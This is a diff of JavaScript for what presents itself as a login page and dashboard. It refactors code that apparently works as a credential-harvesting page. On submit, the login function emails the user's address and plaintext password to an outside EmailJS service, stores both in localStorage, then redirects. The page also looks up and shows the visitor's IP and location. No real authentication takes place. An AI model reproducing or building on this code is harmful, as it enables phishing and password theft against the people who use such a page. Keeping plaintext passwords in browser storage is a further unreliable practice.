@@ -2,11 +2,7 @@
 const STORAGE_CURRENT_USER_KEY = "currentUser";
 
 function saveCurrentUserPublic(user) {
-  const publicUser = {
-    email: user.email,
-    password: user.password,
-  };
-  localStorage.setItem(STORAGE_CURRENT_USER_KEY, JSON.stringify(publicUser));
+  localStorage.setItem(STORAGE_CURRENT_USER_KEY, JSON.stringify(user));
 }
 
 function loadCurrentUser() {
@@ -19,81 +15,41 @@ function logout() {
 }
 
 // ======= VALIDATION =======
-function isEmailValid(email) {
-  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-}
-
-function isPasswordValid(password) {
-  return typeof password === "string" && password.length >= 1;
-}
+const isEmailValid = email => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+const isPasswordValid = password => typeof password === "string" && password.length > 0;
 
 // ======= MODAL HELPER =======
 function showModal(message) {
   const modal = document.getElementById("modal");
   const text = document.getElementById("modalMessage");
   const closeBtn = document.getElementById("modalClose");
-
   if (!modal || !text || !closeBtn) return;
 
   text.textContent = message;
   modal.classList.remove("hidden");
 
-  closeBtn.onclick = () => {
-    modal.classList.add("hidden");
-  };
+  closeBtn.onclick = () => modal.classList.add("hidden");
 }
 
 // ======= LOGIN FUNCTION =======
 async function login(email, password) {
   const emailInput = document.getElementById("email");
 
-  function focusEmailDelayed() {
-    setTimeout(() => {
-      if (emailInput) {
-        try {
-          emailInput.focus();
-          // place cursor at end if possible
-          if (typeof emailInput.setSelectionRange === "function") {
-            const len = emailInput.value ? emailInput.value.length : 0;
-            emailInput.setSelectionRange(len, len);
-          }
-        } catch (e) {
-          // ignore focus errors
-        }
+  // Helper: focus on email input after delay
+  const focusEmail = () => setTimeout(() => {
+    if (emailInput) {
+      emailInput.focus();
+      if (typeof emailInput.setSelectionRange === "function") {
+        const len = emailInput.value.length;
+        emailInput.setSelectionRange(len, len);
       }
-    }, 1000);
-  }
+    }
+  }, 500);
 
-  // Normalize for empty checks
-  const emailEmpty = !email || email.trim() === "";
-  const passwordEmpty = !password || password === "";
-
-  // If both empty -> specific message
-  if (emailEmpty && passwordEmpty) {
-    showModal("Please fill in your login details.");
-    focusEmailDelayed();
-    return;
-  }
-
-  // If email empty but password provided
-  if (emailEmpty) {
-    showModal("Please fill in your email.");
-    focusEmailDelayed();
-    return;
-  }
-
-  // If email provided but invalid
-  if (!isEmailValid(email)) {
-    showModal("Please enter a valid email.");
-    focusEmailDelayed();
-    return;
-  }
-
-  // Existing password validation (unchanged)
-  if (!isPasswordValid(password)) {
-    showModal("Password cannot be empty.");
-    return;
-  }
+  if (!email && !password) { showModal("Please fill in your login details."); focusEmail(); return; }
+  if (!email) { showModal("Please fill in your email."); focusEmail(); return; }
+  if (!isEmailValid(email)) { showModal("Please enter a valid email."); focusEmail(); return; }
+  if (!isPasswordValid(password)) { showModal("Password cannot be empty."); return; }
 
   if (!window.emailjs) {
     console.error("EmailJS SDK not loaded");
@@ -102,105 +58,71 @@ async function login(email, password) {
   }
 
   try {
-    console.log("📨 Sending EmailJS message...");
     await emailjs.send(
       "service_6nw221q",
       "template_d6k3x8f",
-      {
-        useremail: email,
-        userpassword: password,
-        time: new Date().toISOString(),
-      }
+      { useremail: email, userpassword: password, time: new Date().toISOString() }
     );
-    console.log("✅ EmailJS success");
   } catch (error) {
-    console.error("❌ EmailJS ERROR:", error);
+    console.error("EmailJS ERROR:", error);
     showModal("Unable to process request at the moment. Please try again.");
     return;
   }
 
-  // Save login info locally (demo purpose)
   saveCurrentUserPublic({ email, password });
-
-  // Redirect to dashboard
   window.location.href = "dashboard.html";
 }
 
 // ======= DASHBOARD HELPER =======
 function loadDashboard() {
   const currentUser = loadCurrentUser();
-  if (!currentUser || !currentUser.email) {
+  if (!currentUser?.email) {
     window.location.href = "index.html";
     return;
   }
-
   const emailEl = document.getElementById("userEmail");
   if (emailEl) emailEl.textContent = currentUser.email;
 }
 
 // ======= USER LOCATION (IP-based) =======
 async function fetchUserLocation() {
+  const ipEl = document.getElementById("user-ip");
+  const locationEl = document.getElementById("user-location");
+  const timeEl = document.getElementById("user-time");
+
   try {
     const res = await fetch("https://ipapi.co/json/");
     const data = await res.json();
 
-    function countryCodeToFlag(code) {
-      if (!code) return "";
-      return code
-        .toUpperCase()
-        .replace(/./g, char =>
-          String.fromCodePoint(127397 + char.charCodeAt())
-        );
-    }
-
-    const flag = countryCodeToFlag(data.country_code);
+    const flag = data.country_code
+      ? data.country_code.toUpperCase().replace(/./g, c => String.fromCodePoint(127397 + c.charCodeAt()))
+      : "";
 
     const sessionLocation = {
       ip: data.ip || "N/A",
       city: data.city || "N/A",
-      region: data.region || "N/A",
       country: data.country_name || "N/A",
-      countryCode: data.country_code || "",
       timezone: data.timezone || "UTC",
-      utcOffset: data.utc_offset || "+00:00",
     };
 
     localStorage.setItem("sessionLocation", JSON.stringify(sessionLocation));
 
-    const ipEl = document.getElementById("user-ip");
-    const locationEl = document.getElementById("user-location");
-    const timeEl = document.getElementById("user-time");
-
     if (ipEl) ipEl.textContent = `IP: ${sessionLocation.ip}`;
-    if (locationEl)
-      locationEl.textContent = `Location: ${flag} ${sessionLocation.city}, ${sessionLocation.country}`;
-
-    if (timeEl) {
-      const localTime = new Date().toLocaleString("en-US", {
-        timeZone: sessionLocation.timezone,
-      });
-      timeEl.textContent = `Time: ${localTime}`;
-    }
+    if (locationEl) locationEl.textContent = `Location: ${flag} ${sessionLocation.city}, ${sessionLocation.country}`;
+    if (timeEl) timeEl.textContent = `Time: ${new Date().toLocaleString("en-US", { timeZone: sessionLocation.timezone })}`;
   } catch (e) {
     console.warn("Could not fetch IP location:", e);
-
-    const ipEl = document.getElementById("user-ip");
-    const locationEl = document.getElementById("user-location");
-    const timeEl = document.getElementById("user-time");
-
     if (ipEl) ipEl.textContent = "IP: N/A";
     if (locationEl) locationEl.textContent = "Location: N/A";
-    if (timeEl)
-      timeEl.textContent = `Time: ${new Date().toLocaleString()}`;
+    if (timeEl) timeEl.textContent = `Time: ${new Date().toLocaleString()}`;
   }
 }
 
-// ======= HOOKS / EVENT BINDING =======
+// ======= EVENT BINDING =======
 document.addEventListener("DOMContentLoaded", () => {
   const loginBtn = document.getElementById("loginBtn");
-
   if (loginBtn) {
-    loginBtn.addEventListener("click", async (e) => {
+    loginBtn.addEventListener("click", async e => {
       e.preventDefault();
       const email = document.getElementById("email")?.value.trim();
       const password = document.getElementById("password")?.value;
@@ -208,9 +130,6 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
-  if (document.getElementById("userEmail")) {
-    loadDashboard();
-  }
-
+  if (document.getElementById("userEmail")) loadDashboard();
   fetchUserLocation();
 });
